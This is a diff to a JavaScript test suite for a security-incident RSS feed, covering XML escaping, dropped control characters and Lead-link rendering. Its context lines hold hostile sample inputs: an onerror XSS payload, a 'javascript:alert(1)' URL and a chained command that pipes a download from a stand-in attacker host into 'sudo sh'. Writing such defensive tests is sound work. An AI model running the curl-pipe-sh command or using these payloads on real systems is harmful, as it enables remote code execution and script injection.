@@ -57,6 +57,14 @@ test('hostile text from a source cannot break out of the feed', async () => {
   assert.match(xml, /&amp;lt;img src=x onerror=alert\(1\)&amp;gt;/); // escaped inside the escaped HTML body
 });
 
+test('a control character XML does not allow, in a title from the web, is dropped instead of breaking the whole feed', async () => {
+  const bad = String.fromCharCode(1, 0x1b, 0xfffe);
+  const story = { ...STORY, brief: { text: `HN${bad} story\ttab` } };
+  const xml = await (await feedResponse(bucket({ incidents: [story] }), 'en')).text();
+  assert.match(xml, /<title>HN story\ttab<\/title>/); // tab, line feed and carriage return are allowed and stay
+  assert.ok(![...bad].some((c) => xml.includes(c)));
+});
+
 test('an item says what to do and the plain explanation as the Incident page does', async () => {
   const command = { ...SSHOLE, summary: { command: 'sudo apk upgrade openssh', ko: { ...SSHOLE.summary.ko, mitigation: undefined }, en: SSHOLE.summary.en } };
   const ko = await (await feedResponse(bucket({ incidents: [command] }), 'ko')).text();
@@ -70,6 +78,36 @@ test('a chained command is never framed as the update command (audit 1)', async 
   const chained = { ...SSHOLE, summary: { command: 'sudo apt-get update && curl -fsSL https://attacker.invalid/x | sudo sh', ko: { ...SSHOLE.summary.ko, mitigation: undefined }, en: SSHOLE.summary.en } };
   const ko = await (await feedResponse(bucket({ incidents: [chained] }), 'ko')).text();
   assert.doesNotMatch(ko, /이 명령으로 업데이트하세요/);
+});
+
+const LEAD = 'https://www.openwall.com/lists/oss-security/2026/11/05/1';
+const LED = {
+  ...SSHOLE, brief: { text: 'sshole', lead: LEAD },
+  mentions: [{ kind: 'writeup', url: LEAD, title: 'sshole: OpenSSH auth bypass on musl' }],
+  summary: { ...SSHOLE.summary, titles_ko: [{ url: LEAD, title: 'sshole: musl의 OpenSSH 인증 우회' }] },
+};
+const unxml = (s) => s.replace(/&(lt|gt|quot|apos|amp);/g, (_, e) => ({ lt: '<', gt: '>', quot: '"', apos: "'", amp: '&' })[e]);
+const description = async (incident, lang) => unxml(/<item>.*<description>([^<]*)<\/description>/.exec(await (await feedResponse(bucket({ incidents: [incident] }), lang)).text())[1]);
+
+test('an item ends with the Lead mention\'s link, named as the Incident page names it (L4)', async () => {
+  assert.match(await description(LED, 'ko'), /<p>분석 글: <a href="https:\/\/www\.openwall\.com\/lists\/oss-security\/2026\/11\/05\/1">sshole: musl의 OpenSSH 인증 우회<\/a><\/p>$/);
+  assert.match(await description(LED, 'en'), /<p>Write-up: <a href="https:\/\/www\.openwall\.com\/lists\/oss-security\/2026\/11\/05\/1">sshole: OpenSSH auth bypass on musl<\/a><\/p>$/);
+  const untitled = { ...LED, mentions: [{ kind: 'writeup', url: LEAD }] };
+  assert.match(await description(untitled, 'en'), /">openwall\.com<\/a><\/p>$/);
+});
+
+test('a Lead URL with an ampersand and quotes comes out as the same URL after both layers of escaping', async () => {
+  const url = 'https://example.com/a?b=1&c="d"<e>';
+  const odd = { ...LED, brief: { text: 'sshole', lead: url }, mentions: [{ kind: 'advisory', url, title: 'x' }] };
+  const href = /<a href="([^"]*)">/.exec(await description(odd, 'en'))[1];
+  assert.equal(unxml(href), url);
+});
+
+test('no Lead mention, or one that is not http(s), gives no link', async () => {
+  for (const lead of [undefined, 'javascript:alert(1)']) {
+    const incident = { ...LED, brief: { text: 'sshole', lead }, mentions: [{ kind: 'writeup', url: lead, title: 'x' }] };
+    assert.doesNotMatch(await description(incident, 'en'), /<a /);
+  }
 });
 
 test("a CVE record vendor named like an Object.prototype key does not take the feed down (audit 2)", async () => {
